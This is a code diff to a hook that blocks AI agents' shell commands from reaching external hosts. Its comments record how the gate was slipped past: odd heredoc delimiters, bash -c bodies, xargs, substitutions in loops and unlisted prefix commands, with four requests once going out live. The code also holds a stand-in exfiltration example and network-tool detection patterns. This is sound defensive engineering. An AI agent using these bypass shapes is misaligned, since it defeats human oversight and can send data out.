@@ -19,7 +19,12 @@
 //      exactly like a one-liner body (2.). For a shell (bash/sh/zsh/dash/ksh) the body gets the whole
 //      analysis, as if it were the command itself.
 // The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
-// their own options (timeout, stdbuf, nice, nohup, env, sudo, command, exec, time), on every path.
+// their own options (timeout, gtimeout, stdbuf, nice, ionice, caffeinate, nohup, env, sudo, command,
+// exec, time, xargs), on every path.
+//   5. (card c8b1ccbf) the body of `bash/sh/zsh -c BODY` gets the whole analysis; a substitution is
+//      read with the assignments and loop values of the line it sits in; a URL written inside a
+//      substitution that fills a variable is a value of that variable; a network command behind
+//      `xargs` is denied for any external URL in the command, since its arguments come from stdin.
 // FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
 // even when the call goes to localhost and the URL is only payload or a comment: the one-liner rule,
 // applied to heredoc bodies. ONE relaxation, from the maintainers' decision on #1669 (2026-10-06): a
@@ -61,8 +66,8 @@
 //   - network calls INSIDE a script file: the hook sees only the outer command line;
 //   - a program that reaches an interpreter through a PIPE or a file rather than through a heredoc /
 //     here-string attached to the interpreter itself;
-//   - a destination that a DIFFERENT command reads from stdin and turns into arguments (argument
-//     builders such as xargs or parallel);
+//   - a destination that a DIFFERENT command reads from stdin and turns into arguments, other than
+//     xargs (parallel, a while-read over a pipe), or that xargs reads from a file (-a, a pipe from cat);
 //   - values bound by builtins other than `for` and a plain `read`: array fillers (mapfile /
 //     readarray), `read -a` elements beyond the first, and `read` under a non-default IFS (only
 //     whitespace splitting is modelled);
@@ -77,8 +82,10 @@
 //   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig, wget ...).
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
-// Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
-// fleet; that is today's behaviour, not a new hole. Every DENY is appended to the block log.
+// Fail-open on an internal error (logged): a crashed gate must not silence the fleet. Input the
+// parser cannot READ is not a blind pass any more (card c8b1ccbf, shape 1: bash still runs it): a
+// network tool together with a literal external URL in it denies (unreadableVerdict); the rest
+// passes as 'unparseable'. Every DENY is appended to the block log.
 import { readFileSync, appendFileSync, realpathSync, mkdirSync } from 'node:fs'
 import { fileURLToPath } from 'node:url'
 import { dirname, join } from 'node:path'
@@ -255,7 +262,7 @@ function pythonUsesNetwork(text) {
 // because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
 // them a curl inside a loop or an if/then body was never looked at.
 export const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
-  'timeout', 'stdbuf', 'do', 'then', 'else', 'elif', '{', '(', '!'])
+  'timeout', 'stdbuf', 'gtimeout', 'ionice', 'caffeinate', 'xargs', 'do', 'then', 'else', 'elif', '{', '(', '!'])
 // A prefix COMMAND (not a keyword) may carry its own options before the real command word:
 // `timeout -k 5 30 cmd`, `stdbuf -oL cmd`, `nice -n 5 cmd`, `env -u X A=1 cmd`, `sudo -u u cmd`.
 // Every word starting with `-` is skipped; the options listed here also consume the next word.
@@ -269,9 +276,19 @@ const PREFIX_OPT_VALUE = {
   nice: new Set(['-n', '--adjustment']),
   timeout: new Set(['-s', '--signal', '-k', '--kill-after']),
   stdbuf: new Set(['-o', '--output', '-e', '--error', '-i', '--input']),
+  gtimeout: new Set(['-s', '--signal', '-k', '--kill-after']),
+  ionice: new Set(['-c', '--class', '-n', '--classdata', '-p', '--pid', '-P', '--pgid', '-u', '--uid']),
+  caffeinate: new Set(['-t', '-w']),
+  // xargs runs its first operand as the command (card c8b1ccbf); what it reads from stdin becomes
+  // that command's arguments, which the curl rule below cannot see -- see viaXargs in classify.
+  xargs: new Set(['-I', '-L', '-n', '-P', '-s', '-d', '-E', '-a', '--arg-file', '--delimiter',
+    '--max-args', '--max-procs', '--max-chars', '--max-lines', '--eof', '--process-slot-var']),
 }
-const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf'])
-const PREFIX_POSITIONALS = { timeout: 1 }
+// gtimeout is GNU timeout under Homebrew's name; ionice and caffeinate run their operand as a
+// command. A prefix command missing here hid the curl behind it (didi 2026-10-13, card c8b1ccbf).
+const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf',
+  'gtimeout', 'ionice', 'caffeinate', 'xargs'])
+const PREFIX_POSITIONALS = { timeout: 1, gtimeout: 1 }
 // Index of the real command word in `mw` (a sub-command's words): assignments, prefix words and
 // the prefix commands' own options and arguments are skipped.
 export function commandIndex(mw) {
@@ -414,16 +431,17 @@ function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
 export function liftSubstitutions(text) {
   // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
   // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
-  const inners = []; const herestrings = []; let out = ''; let i = 0
+  // innerAt[k]: the offset of inners[k]'s `$(` / backtick (the same in `text` and `stripped`).
+  const inners = []; const innerAt = []; const herestrings = []; let out = ''; let i = 0
   // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
   const lift = (at) => {
     if (text[at] === '$' && text[at + 1] === '(') {
       const j = substEnd(text, at)
-      inners.push(text.slice(at + 2, j - 1)); out += ' '.repeat(j - at); return j
+      inners.push(text.slice(at + 2, j - 1)); innerAt.push(at); out += ' '.repeat(j - at); return j
     }
     if (text[at] === '`') {
       const j = backtickEnd(text, at)
-      inners.push(text.slice(at + 1, j - 1)); out += ' '.repeat(j - at); return j
+      inners.push(text.slice(at + 1, j - 1)); innerAt.push(at); out += ' '.repeat(j - at); return j
     }
     return -1
   }
@@ -458,7 +476,7 @@ export function liftSubstitutions(text) {
       // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
       // by processing it recursively, then continue with the body
       const lineRest = liftSubstitutions(text.slice(i, nl + 1))
-      out += lineRest.stripped; inners.push(...lineRest.inners)
+      out += lineRest.stripped; inners.push(...lineRest.inners); innerAt.push(...lineRest.innerAt.map((p) => p + i))
       herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
@@ -494,7 +512,7 @@ export function liftSubstitutions(text) {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners, herestrings }
+  return { stripped: out, inners, innerAt, herestrings }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -864,17 +882,96 @@ function readValues(text, { names, array }) {
   }
   return out
 }
-// `substituted`: this text is the inside of a $(...) / `...`, whose output the outer line uses.
-export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), substituted = false) {
-  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
-  if (depth < 4) {
-    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true); if (r.deny) return r }
+// The external hosts of every scheme-bearing URL in `text`, listed vendors excepted.
+function externalHosts(text, vendorHosts, vendorDomains) {
+  const found = [...String(text).matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
+  return [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
+}
+// Does `text` name a network tool this hook judges (curl, or a language network primitive)?
+const NET_WORD = /(?:^|[^A-Za-z0-9_-])curl(?![A-Za-z0-9_-])/i
+function namesNetwork(text) { return NET_WORD.test(text) || NET_PRIMITIVE.test(text) }
+// A command line the parser cannot READ (maskInertLiterals gives up: a heredoc delimiter that is not
+// a plain word, `<<E"O"F`, `<<'E'OF`, `<<EOF-1` ...). Under real bash the line still runs, and the
+// curl after the true delimiter goes out (didi, card c8b1ccbf, shape 1): a blind pass here let ANY
+// command through. Closed for the shape this hook exists for: a network tool AND a literal external
+// URL anywhere in the text deny. Anything else stays a pass with reason 'unparseable' (the fleet's
+// own unreadable commands go to localhost), which the excepted-agent rule below still tightens.
+function unreadableVerdict(text, vendorHosts, vendorDomains) {
+  if (namesNetwork(text)) {
+    const hosts = externalHosts(text, vendorHosts, vendorDomains)
+    if (hosts.length) return { deny: true, reason: 'unparseable-external', hosts }
   }
+  return { deny: false, reason: 'unparseable', hosts: [] }
+}
+// The command string of `bash -c BODY` (any flag cluster holding `c`: -c, -lc, -ec), read from the
+// shell's own argv: the first operand after the options. null when the shell runs a file or stdin.
+function shellCBody(args) {
+  let k = 0
+  for (; k < args.length; k++) {
+    const a = args[k]
+    if (a === '--' || !/^[-+]/.test(a)) return null
+    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) break
+    if (/^[-+][oO]$/.test(a) || a === '--rcfile' || a === '--init-file') k++
+  }
+  for (k++; k < args.length; k++) {
+    const a = args[k]
+    if (/^[-+][oO]$/.test(a)) { k++; continue }
+    if (a === '--' || /^[-+][A-Za-z]/.test(a)) continue
+    return a
+  }
+  return null
+}
+// Does a shell read its STDIN as its program? `bash`, `bash -s`, `bash -` do; `bash script.sh -`
+// (a script operand) and `bash -c BODY` read stdin as DATA: `bash agent-msg.sh a b - <<'VEGE'` feeds
+// a message, not a program. `args` are the words after the shell's name, up to the `<<`.
+function shellStdinIsProgram(args) {
+  for (let k = 0; k < args.length; k++) {
+    const a = args[k]
+    if (a === '-') return true
+    if (a === '--') continue
+    if (/^[-+][oO]$/.test(a)) { k++; continue }
+    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(a)) return false
+    if (/^-[A-Za-z]*s[A-Za-z]*$/.test(a)) return true
+    if (/^[-+]/.test(a)) continue
+    return false
+  }
+  return true
+}
+// The words of the sub-command holding offset `at`, from its start up to `at`, past its command word.
+function argsBefore(orig, masked, at) {
+  for (const [a, b] of spans(masked)) {
+    if (at < a || at > b) continue
+    const sw = shellWords(orig.slice(a, at))
+    return sw.slice(commandIndex(sw) + 1)
+  }
+  return []
+}
+// A variable assigned from a substitution (`x=$(...)`, `export x="$(...)"`): the text before the `$(`.
+const ASSIGNED_FROM_SUBST = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)?)?([A-Za-z_][A-Za-z0-9_]*)="?$/
+// `substituted`: this text is the inside of a $(...) / `...`, whose output the outer line uses.
+// `inherited`: the assignments and loop values of the line this text is part of ({ env, loops }).
+// A substitution runs in the loop it sits in, so `for u in URL; do echo "$(curl $u)"; done` reads
+// the inner curl with u bound (card c8b1ccbf, shape 6: live on 2026-10-15, four requests went out).
+export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), substituted = false, inherited = null) {
+  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
+  const { stripped: orig, inners, innerAt, herestrings } = liftSubstitutions(norm)
   const masked = maskInertLiterals(orig)
-  if (masked === null || masked.length !== orig.length) return { deny: false, reason: 'unparseable', hosts: [] }
-  const env = collectAssignments(orig, masked)
-  const loops = collectLoops(orig, masked, env)
+  if (masked === null || masked.length !== orig.length) {
+    if (depth < 4) {
+      for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, inherited); if (r.deny) return r }
+    }
+    return unreadableVerdict(norm, vendorHosts, vendorDomains)
+  }
+  const env = { ...(inherited?.env ?? {}), ...collectAssignments(orig, masked) }
+  const loops = { ...(inherited?.loops ?? {}), ...collectLoops(orig, masked, env) }
+  // `x=$(cat <<EOF ... EOF); curl "$x"`: the substitution's output is not known, but a URL written in
+  // it is a value x can take (card c8b1ccbf, shape 5). Judged like a loop value; the plain reading,
+  // with x empty, is judged as well.
+  innerAt.forEach((at, k) => {
+    const m = ASSIGNED_FROM_SUBST.exec(orig.slice(orig.lastIndexOf('\n', at - 1) + 1, at))
+    const urls = m ? (inners[k].match(URL_RE) ?? []) : []
+    if (urls.length) loops[m[1]] = [...(loops[m[1]] ?? []), ...urls]
+  })
   const feeds = stdinFeeds(orig, masked, herestrings, env)
   // A `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to
   // the fed lines in the same command, exactly like `for u in URL`: the values join the loop values.
@@ -884,6 +981,9 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     if (c !== 'done' && c !== 'read') continue
     const text = f.expands ? expand(f.text, env) : f.text
     for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
+  }
+  if (depth < 4) {
+    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, true, { env, loops }); if (r.deny) return r }
   }
   // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
   // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
@@ -897,7 +997,11 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     for (const text of [plain, ...(variants ?? [])]) {
       if (shell) {
         if (depth >= 4) break
-        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted)
+        const r = classify(text, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops })
+        // The unreadable-line rule judges a PROGRAM. A body fed to a script as data keeps the reading
+        // it had before card c8b1ccbf: measured on 4 days of fleet commands (21 086), the one heredoc
+        // it would have newly denied was an agent-msg.sh message mentioning a link.
+        if (r.deny && r.reason === 'unparseable-external' && !shellStdinIsProgram(argsBefore(orig, masked, f.at))) continue
         if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
         continue
       }
@@ -922,11 +1026,35 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       // The command NAME is read from the ORIGINAL text through shellWords, not from the masked one:
       // masking blanks a quoted "curl", and the shell runs `Curl` (case-insensitive disk,
       // /usr/bin/Curl exists), `\curl`, `"curl"` and `c''url` as curl (didi 19977, marveen 19980).
-      const cmd = commandName(shellWords(named.slice(a, b)), mw[i])
+      const sw = shellWords(named.slice(a, b))
+      const cmd = commandName(sw, mw[i])
+      // xargs before the command: its arguments come from stdin, which the argv reading below never
+      // sees (`echo URL | xargs curl`, `xargs curl <<< URL`; card c8b1ccbf, shape 3).
+      const viaXargs = sw.slice(0, commandIndex(sw)).some((w) => normalizedName(w) === 'xargs')
+      // `bash -c BODY`: the body is a command line, judged in full (card c8b1ccbf, shape 2).
+      if (SHELL.test(cmd)) {
+        const argv = shellWords(text)
+        const at = argv.findIndex((w) => normalizedName(w) === cmd)
+        const body = at === -1 ? null : shellCBody(argv.slice(at + 1))
+        if (body === null) continue
+        const r = depth < 4
+          ? classify(body, depth + 1, vendorHosts, vendorDomains, substituted, { env, loops })
+          : unreadableVerdict(body, vendorHosts, vendorDomains)
+        if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
+        if (viaXargs && namesNetwork(body)) {
+          const hosts = externalHosts(norm, vendorHosts, vendorDomains)
+          if (hosts.length) return { deny: true, reason: 'xargs-external', hosts }
+        }
+        continue
+      }
       let target = null
       if (cmd === 'curl') target = 'curl'
       else if (INTERPRETER.test(cmd.toLowerCase()) && hasCodeFlag(cmd, mw.slice(i + 1)) && usesNetwork(cmd, text)) target = 'one-liner'
       if (!target) continue
+      if (viaXargs) {
+        const hosts = externalHosts(norm, vendorHosts, vendorDomains)
+        if (hosts.length) return { deny: true, reason: 'xargs-external', hosts }
+      }
       // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
       // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
       // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
@@ -995,7 +1123,11 @@ if (isInvokedDirectly()) {
   }
   if (r.deny) {
     logRow({ reason: r.reason, hosts: r.hosts })
-    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})` } }))
+    // An unreadable line is denied by its URL, not its parse: name the way out (card c8b1ccbf).
+    const hint = r.reason === 'unparseable-external'
+      ? ' A kapu ezt a parancsot nem tudta ertelmezni (pl. nem egyszeru heredoc-hatarolo, <<E"O"F): ha a hivas localhostra megy, irj egyszeru, idezett hatarolot (<<\'EOF\'), vagy a szoveget a Write eszkozzel fajlba.'
+      : ''
+    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG}${hint} (hoszt: ${r.hosts.join(', ')})` } }))
   }
   process.exit(0)
 }
